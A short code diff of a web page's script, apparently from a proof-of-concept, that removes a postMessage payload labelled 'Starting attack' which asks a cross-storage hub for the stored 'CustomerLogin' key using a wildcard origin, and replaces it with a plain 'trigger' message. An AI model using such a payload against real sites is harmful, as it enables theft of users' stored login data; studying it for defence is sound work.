@@ -4,21 +4,15 @@
     <script>
       // wait until the parent finishes loading the target iframe
       setTimeout(() => {
-       
-        console.log("Starting attack");
-        const payload = JSON.stringify({
-            id: "1234567",
-            action: "cross-storage:get",
-            params: { key: "CustomerLogin" }
-          });
 
-        window.parent.postMessage(payload, "*");
-        console.log("Sent message to storageHub");
+        window.parent.postMessage("trigger", "*");
+        console.log("Sent message to parent");
         
       }, 2000); // wait a bit for iframe to load
     </script>
   </body>
 </html>
+
 
 
 
